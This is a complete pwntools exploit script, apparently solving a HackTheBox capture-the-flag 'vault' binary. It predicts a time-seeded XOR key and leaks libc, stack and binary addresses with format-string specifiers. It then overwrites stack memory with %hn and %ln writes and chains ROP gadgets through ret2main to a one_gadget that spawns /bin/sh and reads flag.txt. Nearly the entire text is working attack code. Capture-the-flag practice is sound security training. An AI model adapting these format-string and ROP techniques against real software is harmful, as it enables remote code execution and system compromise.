#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from math import floor
from ctypes import CDLL

ENTRY_SIZE = 0x188

context.log_level   = 'CRITICAL'
context.binary = e  = ELF(args.BINARY or './vault',checksec=False)
libc                = ELF(args.LIBC or "./libc.so.6",checksec=False)
r                   = None

# the index is needed for entries[idx] even after we ret2main the idx will be incremented
# since it's in the .data section and the compiler thought it's a good idea to not reinitialize it
# in main . it's initialized in the elf and that's enough.
idx = 0

libc_cdll   = CDLL("libc.so.6")
global_key  = b'\1'*64

def check_badbytes(payload):
    # checking for bad bytes that might trip scanf
    assert len([i for i in payload if i in b'\v\f\n\r\t ']) == 0

# wait for marker [menu end]
wfm = lambda : r.recvuntil(b'3. Exit\n')

def add(url:bytes, password:bytes,w=True):
    global r
    if w: wfm()
    r.sendline(b'1')
    r.sendlineafter(b'URL: ',url)
    r.sendlineafter(b'Password: ',password)

def view(i:int):
    global r
    r.sendlineafter(b'3. Exit\n',b'2')
    r.sendlineafter(b'Index: ',str(i).encode())

def xor(data:bytes, key:bytes):
    return bytes([data[i]^key[i%len(key)] for i in range(len(data))])

def conn():
    global r
    if args.GDB:
        r = gdb.debug(
            ['./vault'],
            gdbscript='''
                b *view_entries+387
                c
                c
                set $r12=&entries
                b printf
                c
                c
            '''
        )
    else:
        r = remote(args.HOST or "localhost", args.PORT or 1337)

def init_key():
    global global_key
    global_key = b''
    now = int(floor(time.time()))
    libc_cdll.srand(now)
    for _ in range(64):
        global_key += p8(libc_cdll.rand() &0xff)


def exploit(url:bytes,password:bytes):
    global r,idx
    check_badbytes(password)
    add(url, password,False)
    view(idx)
    view(idx)
    idx += 1

def fmt_payload(fmt:bytes):
    global idx,global_key,e
    url = b''
    url+= fmt
    url = url.ljust(0x80,b'A')+b':80'

    password  = b''
    password += xor(p16((e.sym.entries+ENTRY_SIZE*idx)&0xffff),global_key[:2])
    password += p8(global_key[2])               # null
    password  = password.ljust(0xff,b'C')

    exploit(url,password)

def rop_payload(addr:int):
    url      = b'A'*0x80 +b':80'
    password = b'A'*0x20
    password+= xor(p64(addr),global_key[0x20:0x28])
    password = password.ljust(0xff,b'C')

    exploit(url,password)    

j = 0 
with log.progress('Guessing....', level=logging.CRITICAL) as l:
    while True:
        try:
            idx=0
            j+=1
            l.status(f'0x{j:02x}/0x{2**8:02x}')

            conn()
            init_key()

            url = b''
            for i in [3,9,10]:  # libc/rbp/binary
                url+= (f'%{i}$p'.encode()+ b'HTB')
            
            fmt_payload(url)
            wfm()
            x = r.recv(timeout=1)
            if b'0x' in x:
                libc.address    = int(x.split(b'HTB')[0],base=16)-0x114887
                stack_leak      = int(x.split(b'HTB')[1],base=16)           # rbp
                target_mem      = stack_leak-0x70                           # rbp-0x70
                e.address       = int(x.split(b'HTB')[2],base=16)-0x1200    # main

                l.status(f'''leaks acquired''')

                fmt_payload(f'%{target_mem&0xffff}c%20$hn'.encode())    # rbp->rbp-0x70
                fmt_payload(b'%47$ln')                                  # [rbp-0x70]=NULL
            
                l.status(f'''stack altered''')

                rop_payload(libc.address+0x145fda)  # pop rbp ; ret2main
                init_key()                          # reset the key since main will call init_key again

                l.status(f'''$rbp ready''')

                rop_payload(libc.address+0xebd43)   # one_gadget

                l.status(f'''one_gadget engaged''')
                
                print(r.clean())
                r.sendline(b'cat flag.txt; exit')
                flag = r.recvline().decode().strip()
                print(flag)
                if 'HTB' in flag:
                    l.success(flag)
                    break
                r.interactive()
        except AssertionError:
            # means that this srand(time(NULL)) will not work with our payload . sleep for a second
            time.sleep(1)
        except Exception as _:
            # print(traceback.print_exc())
            pass

        r.close()
        continue

# GADGETS

# set RBP then re2main
# 0x145fda: pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret ; (1 found)

# one_gadget
# 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x50 is writable
# rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
